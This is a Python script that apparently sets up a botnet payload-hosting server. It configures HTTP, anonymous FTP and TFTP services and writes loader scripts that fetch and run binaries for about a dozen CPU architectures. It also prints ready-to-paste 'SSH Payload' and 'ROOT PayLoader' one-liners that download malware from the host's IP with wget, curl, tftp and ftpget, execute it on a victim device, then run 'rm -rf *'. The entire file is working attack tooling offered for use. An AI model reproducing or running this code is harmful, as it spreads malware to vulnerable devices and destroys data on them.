import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "owo"
exec_name = "owo"
bin_prefix = "bins."
bin_directory = "bins"
archs = ["arc"                #0
"x86",                        #1
"x86_32",                     #2
"mips",                       #3
"mpsl",                       #4
"arm4",                       #5
"arm5",                       #6
"arm6",                       #7
"arm7",                       #8
"powerpc",                    #9
"m68k",                       #10
"sparc",                      #11
"sh4"]                        #12
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[0;31mSetting Up your ROOT And SSH Payload....")
print(" ")
run("service apache2 start &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[0;37mExporting to payload.txt...")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/bins3.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/bins3.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/bins3.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/bins2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/bins2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/bins2.sh')
run('echo "#!/bin/bash" > /var/www/html/bins.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/bins2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/bins2.sh')
run('echo "#!/bin/bash" > /var/ftp/bins1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/bins1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/bins1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/bins.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/bins1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/bins3.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/bins2.sh')    
run("service xinetd restart &> /dev/null")
run("service apache2 restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;37m----------------------------------------------------------------------------")
print("\x1b[1;37mSSH Payload: \x1b[0;31mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins.sh; curl -O http://" + ip + "/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp " + ip + " -c get bins3.sh; chmod 777 bins3.sh; sh bins3.sh; tftp -r bins2.sh -g " + ip + "; chmod 777 bins2.sh; sh bins2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " bins1.sh bins1.sh; sh bins1.sh; rm -rf bins.sh bins3.sh bins2.sh bins1.sh; rm -rf *\x1b[0m")
print("\x1b[0;31m----------------------------------------------------------------------------")
print("\x1b[1;37mROOT PayLoader: \x1b[0;31mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins/enigma.x86 -O /tmp/enigma; chmod +x /tmp/enigma; /tmp/enigma enigma.x86")
print("\x1b[0;37m----------------------------------------------------------------------------")
complete_payload1 = ("(SSH Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins.sh; curl -O http://" + ip + "/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp " + ip + " -c get bins3.sh; chmod 777 bins3.sh; sh bins3.sh; tftp -r bins2.sh -g " + ip + "; chmod 777 bins2.sh; sh bins2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " bins1.sh bins1.sh; sh bins1.sh; rm -rf bins.sh bins3.sh bins2.sh bins1.sh; rm -rf *)")
complete_tab = ("																			")
complete_line = ("---------------------------------------------------------------------------------------------------------------------------------------------------------------------")

complete_payload2 = ("(ROOT PayLoader: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/bins/enigma.x86 -O /tmp/enigma; chmod +x /tmp/enigma; /tmp/enigma enigma.x86)")
f = open("payload.txt","w+")
f.write(complete_payload1)
f.write(complete_tab)
f.write(complete_line)

f.write(complete_payload2)
f.close()
